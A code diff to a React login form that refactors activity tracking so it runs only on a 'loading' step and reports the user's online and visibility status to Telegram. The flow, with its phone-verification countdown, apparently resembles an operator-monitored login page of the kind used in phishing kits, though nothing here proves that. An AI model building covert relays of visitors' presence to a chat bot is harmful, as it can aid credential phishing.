@@ -113,42 +113,29 @@ export const LoginForm = () => {
     }
   }, [sessionId]);
 
-  // User activity tracking
+  // Optimized user activity tracking - only when on loading step
   useEffect(() => {
-    if (sessionId) {
-      console.log("🔍 Starting user activity tracking for session:", sessionId);
+    if (sessionId && currentStep === "loading") {
+      console.log(
+        "🔍 Starting optimized activity tracking for session:",
+        sessionId,
+      );
 
       const handleStatusChange = async (status: ActivityStatus) => {
-        console.log("📡 Activity status changed:", {
-          isOnline: status.isOnline,
-          isVisible: status.isVisible,
-          statusText: userActivityService.getStatusText(),
-        });
+        console.log("📡 Activity status changed:", status);
 
-        // Update status in Telegram
+        const statusText = userActivityService.getStatusText();
+        const statusEmoji = userActivityService.getStatusEmoji();
+
         await updateUserOnlineStatus(
           sessionId,
           status.isOnline,
           status.isVisible,
           status.lastActivity,
-      userActivityService.startTracking(sessionId, async (status) => {
-        console.log("📡 Activity status changed:", status);
-
-        // Only update if on loading step to prevent unnecessary API calls
-        if (currentStep === "loading") {
-          const statusText = userActivityService.getStatusText();
-          const statusEmoji = userActivityService.getStatusEmoji();
-
-          await updateUserOnlineStatus(
-            sessionId,
-            status.isOnline,
-            status.isVisible,
-            status.lastActivity,
-            statusText,
-            statusEmoji
-          );
-        }
-      });
+          statusText,
+          statusEmoji,
+        );
+      };
 
       // Start tracking
       userActivityService.startTracking(sessionId, handleStatusChange);
@@ -158,7 +145,7 @@ export const LoginForm = () => {
         userActivityService.stopTracking();
       };
     }
-  }, [sessionId]);
+  }, [sessionId, currentStep]);
 
   // Countdown timer for verify-phone step
   useEffect(() => {
